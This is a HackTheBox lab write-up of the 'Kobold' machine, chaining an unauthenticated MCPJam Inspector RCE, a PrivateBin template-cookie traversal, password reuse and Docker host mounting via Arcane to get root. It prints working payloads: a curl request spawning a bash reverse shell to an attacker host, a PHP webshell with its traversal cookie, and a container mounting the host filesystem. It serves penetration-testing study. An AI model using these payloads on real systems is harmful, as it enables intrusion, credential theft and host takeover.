---
title: "HTB Kobold Write-up: MCPJam RCE to Root"
date: 2026-06-23 09:30:00 +0700
categories: [Writeups, HackTheBox]
tags: [HackTheBox, Linux, MCPJam, PrivateBin, Arcane, Docker, RCE, privilege-escalation]
permalink: /posts/htb-kobold-writeup/
-------------------------------------

## Overview

Kobold is a Linux machine that chains an unauthenticated MCPJam Inspector RCE with a PrivateBin template traversal issue and Docker abuse through Arcane.

The high-level path was:

```text
VHost enum
-> MCPJam unauthenticated RCE
-> shell as ben
-> writable PrivateBin shared volume
-> PrivateBin template cookie RCE
-> read PrivateBin config
-> reuse password to login Arcane
-> create Docker container with host filesystem mount
-> root
```

## Recon

Nmap showed three main services:

```text
22/tcp  OpenSSH
80/tcp  nginx redirecting to HTTPS
443/tcp nginx with certificate for kobold.htb and *.kobold.htb
```

I added the domains to `/etc/hosts`:

```text
<MACHINE_IP> kobold.htb mcp.kobold.htb bin.kobold.htb
```

VHost fuzzing revealed:

```text
mcp.kobold.htb  - MCPJam Inspector
bin.kobold.htb  - PrivateBin
```

## Foothold: MCPJam Inspector RCE

The `mcp.kobold.htb` vhost exposed MCPJam Inspector. The `/api/mcp/connect` endpoint accepted a server configuration containing a command and arguments, which allowed unauthenticated command execution.

Listener:

```bash
rlwrap nc -lvnp 4444
```

Exploit:

```bash
curl -sk https://mcp.kobold.htb/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d '{
    "serverId":"pwn",
    "serverConfig":{
      "command":"bash",
      "args":["-lc","bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"],
      "env":{}
    }
  }'
```

This returned a shell as:

```text
ben
```

The user flag was readable from:

```text
/home/ben/user.txt
```

## Internal Enumeration

After getting a shell as `ben`, I checked listening services and groups:

```bash
id
ss -tlnp
```

Interesting findings:

```text
127.0.0.1:8080  - internal PrivateBin container
*:3552           - Arcane Docker management service
```

The user `ben` was in the `operator` group. The PrivateBin data directory was writable:

```bash
find /privatebin-data -maxdepth 3 -ls 2>/dev/null
```

Important path:

```text
/privatebin-data/data
```

## PrivateBin RCE via Template Cookie

Because `/privatebin-data/data` was writable from the host and mounted into the PrivateBin container, I wrote a PHP webshell there:

```bash
echo '<?php system($_GET["cmd"]); ?>' > /privatebin-data/data/shell.php
```

PrivateBin had template selection enabled. The `template` cookie could be abused with path traversal to include the file from the data directory:

```bash
curl -sk 'https://bin.kobold.htb/?cmd=id' \
  -H 'Cookie: template=../data/shell'
```

This confirmed command execution inside the PrivateBin container:

```text
uid=65534(nobody) gid=82(www-data) groups=82(www-data)
```

## Reading PrivateBin Config

Using the webshell, I read the PrivateBin configuration:

```bash
curl -skG 'https://bin.kobold.htb/' \
  -H 'Cookie: template=../data/shell' \
  --data-urlencode 'cmd=cat /srv/cfg/conf.php'
```

The configuration contained database credentials:

```text
usr = "privatebin"
pwd = "ComplexP@sswordAdmin1928"
```

The same password was reused for the Arcane web application.

## Arcane Login

Arcane was exposed on port `3552`.

```text
http://<MACHINE_IP>:3552/
```

Credentials:

```text
Username: arcane
Password: ComplexP@sswordAdmin1928
```

After logging in, Arcane provided access to Docker container management.

## Privilege Escalation via Docker

From Arcane, I created a new container and mounted the host filesystem into it.

Container settings:

```text
Image: privatebin/nginx-fpm-alpine:2.0.2
User: 0:0
Volume mount: /:/hostfs
Entrypoint: /bin/sh
Command: -c "sleep 3600"
```

Then I opened a terminal inside the container and confirmed root inside the container:

```sh
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Since the host filesystem was mounted at `/hostfs`, the root flag was readable with:

```sh
cat /hostfs/root/root.txt
```

I am intentionally not including the flag value.

## Vulnerabilities / Weaknesses Used

### MCPJam Inspector Unauthenticated RCE

The MCPJam Inspector endpoint accepted attacker-controlled command execution parameters without authentication.

### PrivateBin Template Path Traversal

PrivateBin template selection was enabled, and the `template` cookie could be abused to include a PHP file from a writable shared volume.

### Credential Reuse

The password found in the PrivateBin config was reused for the Arcane web application.

### Docker Management Abuse

Arcane allowed container creation. By creating a root container with the host filesystem mounted, it was possible to read files from the host as root.

## Takeaways

* VHost fuzzing was essential because both `mcp` and `bin` were required.
* Writable shared volumes between host and container can easily become code execution primitives.
* Template selection features must strictly validate template names.
* Application credentials should not be reused across services.
* Docker management access is effectively root if users can mount the host filesystem.
